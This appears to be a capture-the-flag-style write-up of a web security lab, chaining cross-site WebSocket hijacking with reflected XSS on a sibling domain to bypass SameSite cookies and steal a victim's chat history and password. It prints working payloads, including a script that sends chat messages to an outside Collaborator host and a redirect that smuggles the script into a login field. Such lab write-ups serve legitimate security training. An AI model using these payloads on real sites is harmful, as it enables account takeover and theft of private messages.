![image](https://github.com/udayk01/Web-Security/assets/52235763/b1b22d55-7cdb-444f-be77-b5e37aa57a14)

## Solution:

### Study the live chat feature
> In Burp's browser, go to the live chat feature and send a few messages.

![image](https://github.com/udayk01/Web-Security/assets/52235763/22d50b5b-2bb7-4719-992a-cbba596ce084)

> In Burp, go to the Proxy > HTTP history tab and find the WebSocket handshake request. This should be the most recent GET /chat request.

![image](https://github.com/udayk01/Web-Security/assets/52235763/6305e62b-512b-4abd-ab6c-8580080c07ab)

>> Notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSWSH if you can bypass any SameSite cookie restrictions.

> In the browser, refresh the live chat page.

![image](https://github.com/udayk01/Web-Security/assets/52235763/b319ea8d-368d-4b69-ad56-c1a10956f3e6)

> In Burp, go to the Proxy > WebSockets history tab. Notice that when you refresh the page, the browser sends a READY message to the server. This causes the server to respond with the entire chat history.

![image](https://github.com/udayk01/Web-Security/assets/52235763/60e59306-5217-4fc0-bfcf-277e17c4ce74)

### Confirm the CSWSH vulnerability

> In Burp, go to the Collaborator tab and click Copy to clipboard. A new Collaborator payload is saved to your clipboard.

```9jtzanx4rq7424h7abws5i6a51bszin7.oastify.com```

> In the browser, go to the exploit server and use the following template to create a script for a CSWSH proof of concept:
```
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

![image](https://github.com/udayk01/Web-Security/assets/52235763/a6c3f16d-e545-4138-9ef1-ada247f76513)

> Store and view the exploit yourself

![image](https://github.com/udayk01/Web-Security/assets/52235763/e7948284-78cd-4167-85c0-8b072b149bcd)

> In Burp, go back to the Collaborator tab and click Poll now. Observe that you have received an HTTP interaction, which indicates that you've opened a new live chat connection with the target site.

![image](https://github.com/udayk01/Web-Security/assets/52235763/40ac2edd-a7ee-4968-beb3-46a3f95d235e)

>> Notice that although you've confirmed the CSWSH vulnerability, you've only exfiltrated the chat history for a brand new session, which isn't particularly useful.

> Go to the Proxy > HTTP history tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent GET /chat request.

![image](https://github.com/udayk01/Web-Security/assets/52235763/dda53801-1eeb-402a-8a0d-c2e77dc2e7f3)

>> Notice that your session cookie was not sent with the request.

> In the response, notice that the website explicitly specifies SameSite=Strict when setting session cookies. This prevents the browser from including these cookies in cross-site requests.

![image](https://github.com/udayk01/Web-Security/assets/52235763/c38ab2d3-d2f2-4f00-a97a-0c28101afabe)

### Identify an additional vulnerability in the same "site"

> In Burp, study the proxy history and notice that responses to requests for resources like script and image files contain an Access-Control-Allow-Origin header, which reveals a sibling domain at cms-YOUR-LAB-ID.web-security-academy.net.

![image](https://github.com/udayk01/Web-Security/assets/52235763/585cbf0a-3a77-4ded-8414-9e2d33f0add0)

> In the browser, visit this new URL to discover an additional login form.

![Screenshot 2024-04-19 222243](https://github.com/udayk01/Web-Security/assets/52235763/35ecc419-cae4-44a7-942e-dcf9439e892d)

> Submit some arbitrary login credentials and observe that the username is reflected in the response in the Invalid username message.

![image](https://github.com/udayk01/Web-Security/assets/52235763/f41ae08b-c907-4377-872a-39c10c733151)

> Try injecting an XSS payload via the username parameter, for example:

```<script>alert(1)</script>```

![image](https://github.com/udayk01/Web-Security/assets/52235763/5fca8bbc-76a2-4463-8d17-6234fd9e4be5)

![image](https://github.com/udayk01/Web-Security/assets/52235763/a4da814e-39e8-447a-b551-3871580d7cd4)

>> Observe that the alert(1) is called, confirming that this is a viable reflected XSS vector.

> Send the POST /login request containing the XSS payload to Burp Repeater.

![image](https://github.com/udayk01/Web-Security/assets/52235763/54c416d2-2344-49cc-b1bc-599d541fd125)

> In Burp Repeater, right-click on the request and select Change request method to convert the method to GET. Confirm that it still receives the same response.

![image](https://github.com/udayk01/Web-Security/assets/52235763/b9f717f8-e4e8-4be6-9531-f22bf90fcabd)

> Right-click on the request again and select Copy URL. Visit this URL in the browser and confirm that you can still trigger the XSS. As this sibling domain is part of the same site, you can use this XSS to launch the CSWSH attack without it being mitigated by SameSite restrictions.

![Screenshot 2024-04-19 222744](https://github.com/udayk01/Web-Security/assets/52235763/6dbec21a-8328-498e-8d44-0fe4d3cd4ca3)

### Bypass the SameSite restrictions

> Recreate the CSWSH script that you tested on the exploit server earlier.
```
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

![image](https://github.com/udayk01/Web-Security/assets/52235763/b385951f-eef2-403e-bea6-17dcae6ac2a1)

> URL encode the entire script.

![image](https://github.com/udayk01/Web-Security/assets/52235763/45b057e8-2701-4bb4-9f19-1b6660fc2963)

> Go back to the exploit server and create a script that induces the viewer's browser to send the GET request you just tested, but use the URL-encoded CSWSH payload as the username parameter. The following is one possible approach:
```
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```

![image](https://github.com/udayk01/Web-Security/assets/52235763/2039942a-16da-45f2-a548-008c28ac2d2c)

> Store and view the exploit yourself.

![image](https://github.com/udayk01/Web-Security/assets/52235763/35e2481b-0578-4c0a-9780-53deec7c8097)

> In Burp, go back to the Collaborator tab and click Poll now. Observe that you've received a number of new interactions, which contain your entire chat history.

![image](https://github.com/udayk01/Web-Security/assets/52235763/1180f719-0144-4385-aacd-51a4f458d26d)

> Go to the Proxy > HTTP history tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent GET /chat request.

![image](https://github.com/udayk01/Web-Security/assets/52235763/049b0256-3977-42e4-b37d-73884ebc6a77)

>> Confirm that this request does contain your session cookie. As it was initiated from the vulnerable sibling domain, the browser considers this a same-site request.

### Deliver the exploit chain

> Go back to the exploit server and deliver the exploit to the victim.

![image](https://github.com/udayk01/Web-Security/assets/52235763/b8f37b7d-90a1-438d-bebe-b9f248dcf67a)

> In Burp, go back to the Collaborator tab and click Poll now.

![image](https://github.com/udayk01/Web-Security/assets/52235763/8e8f8fd6-5946-4f42-a36f-1aa8fbc85dc8)

>> Observe that you've received a number of new interactions.

>> Study the HTTP interactions and notice that these contain the victim's chat history.

>> Find a message containing the victim's username and password.

![image](https://github.com/udayk01/Web-Security/assets/52235763/5ecf1f25-78bf-4750-9ec5-2f93d2481c49)

password: u9ljma0qv73l4p9gydo6

> Use the newly obtained credentials to log in to the victim's account and the lab is solved.

![Screenshot 2024-04-19 224931](https://github.com/udayk01/Web-Security/assets/52235763/e5d32650-c07f-4349-9247-52d5829643cf)
